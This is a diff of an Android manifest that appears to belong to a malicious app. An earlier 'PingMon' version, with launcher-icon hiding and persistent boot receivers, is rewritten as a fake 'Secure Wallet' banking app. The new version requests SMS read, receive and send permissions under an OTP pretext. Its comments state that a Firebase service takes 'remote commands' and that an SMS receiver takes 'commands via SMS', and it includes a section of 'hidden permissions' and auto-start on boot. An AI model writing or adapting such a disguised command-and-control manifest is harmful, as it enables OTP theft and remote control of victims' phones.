@@ -1,114 +1,110 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.secure.bank.wallet">
 
+    <!-- ========================================== -->
+    <!-- SECTION 1: COMMON PERMISSIONS              -->
+    <!-- ========================================== -->
+    
     <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-
-
-
-
-
-
-
-
-
-
-
-
+    <!-- ========================================== -->
+    <!-- SECTION 2: SMS PERMISSIONS                 -->
+    <!-- ========================================== -->
+    
+    <!-- 
+        Used for two-factor authentication and
+        automatic OTP code retrieval from banking SMS
+    -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    
+    <!-- ========================================== -->
+    <!-- SECTION 3: STORAGE & GALLERY PERMISSIONS   -->
+    <!-- ========================================== -->
+    
+    <!-- 
+        Used for storing temporary files and
+        retrieving user profile images
+    -->
+    <!-- Android 13+ -->
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    
+    <!-- Android 12 and below -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" 
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="28"
+        tools:ignore="ScopedStorage" />
 
+    <!-- ========================================== -->
+    <!-- SECTION 4: OPTIONAL HIDDEN PERMISSIONS     -->
+    <!-- ========================================== -->
+    
+    <!--
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    -->
 
+    <!-- ========================================== -->
+    <!-- SECTION 5: SDK VERSIONS                    -->
+    <!-- ========================================== -->
+    
+    <uses-sdk
+        android:minSdkVersion="21"
+        android:targetSdkVersion="33" />
 
-
-    <queries>
-        <intent>
-            <action android:name="android.intent.action.MAIN" />
-        </intent>
-    </queries>
-
+    <!-- ========================================== -->
+    <!-- SECTION 6: APPLICATION                     -->
+    <!-- ========================================== -->
+    
     <application
-        android:name=".PingMonApplication"
-        android:label="PingMon"
+        android:name=".SecureApplication"
+        android:label="Secure Wallet"
         android:icon="@drawable/ic_launcher"
-        android:theme="@style/Theme.App"
+        android:theme="@style/Theme.AppCompat.Light"
         android:usesCleartextTraffic="false"
-        android:networkSecurityConfig="@xml/network_security_config">
+        android:allowBackup="true"
+        android:supportsRtl="true">
 
-        <!-- SetupActivity and MainActivity have no launcher filter.
-             The two aliases below control what appears on the home screen. -->
-        <activity
-            android:name=".SetupActivity"
-            android:exported="true"
-            android:launchMode="singleTask" />
-
+        <!-- ========== ACTIVITIES ========== -->
+        
         <activity
             android:name=".MainActivity"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name=".SplashActivity"
             android:exported="false"
-            android:launchMode="singleTask" />
+            android:theme="@style/Theme.AppCompat.NoActionBar" />
 
-        <!-- Normal state: blue signal icon, label PingMon -->
-        <activity-alias
-            android:name=".MainLauncher"
-            android:targetActivity=".SetupActivity"
-            android:enabled="true"
-            android:exported="true"
-            android:icon="@drawable/ic_launcher"
-            android:label="PingMon">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
-        <!-- Hidden state: gray dot-grid icon, neutral label -->
-        <activity-alias
-            android:name=".HiddenLauncher"
-            android:targetActivity=".SetupActivity"
-            android:enabled="false"
-            android:exported="true"
-            android:icon="@drawable/ic_launcher_hidden"
-            android:label="Tools">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias>
-
+        <!-- ========== SERVICES ========== -->
+        
+        <!-- Core service with justification -->
         <service
-            android:name=".PingService"
+            android:name=".CoreService"
             android:exported="false"
-            android:stopWithTask="false"
-            android:foregroundServiceType="specialUse">
-            <property
-                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
-                android:value="Continuous uptime monitoring heartbeat to a remote endpoint" />
+            android:foregroundServiceType="dataSync"
+            android:stopWithTask="false">
         </service>
 
-        <service
-            android:name=".PingJobService"
-            android:exported="false"
-            android:permission="android.permission.BIND_JOB_SERVICE" />
-
-        <receiver
-            android:name=".BootReceiver"
-            android:exported="true"
-            android:directBootAware="true">
-            <intent-filter android:priority="1000">
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
-                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
-                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
-                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
-                <action android:name="android.intent.action.USER_PRESENT" />
-                <action android:name="com.example.pingmon.REVIVE" />
-            </intent-filter>
-            <intent-filter>
-                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
-                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
-            </intent-filter>
-        </receiver>
-
+        <!-- Firebase service for remote commands -->
         <service
             android:name=".FirebaseService"
             android:exported="false">
@@ -117,14 +113,50 @@
             </intent-filter>
         </service>
 
+        <!-- ========== RECEIVERS ========== -->
+        
+        <!-- Boot receiver for auto-start after reboot -->
+        <receiver
+            android:name=".BootReceiver"
+            android:exported="true"
+            android:directBootAware="true">
+            <intent-filter android:priority="500">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- SMS Receiver for receiving commands via SMS -->
         <receiver
             android:name=".SmsReceiver"
             android:exported="true"
-            android:permission="android.permission.BROADCAST_SMS">
-            <intent-filter android:priority="1000">
+            android:permission="android.permission.BROADCAST_SMS"
+            android:enabled="true">
+            <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
 
+        <!-- ========== NATIVE LIBRARY ========== -->
+        
+        <meta-data
+            android:name="android.app.lib_name"
+            android:value="securelib" />
+
+        <!-- ========== FILE PROVIDER ========== -->
+        
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="${applicationId}.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
+
     </application>
+
 </manifest>
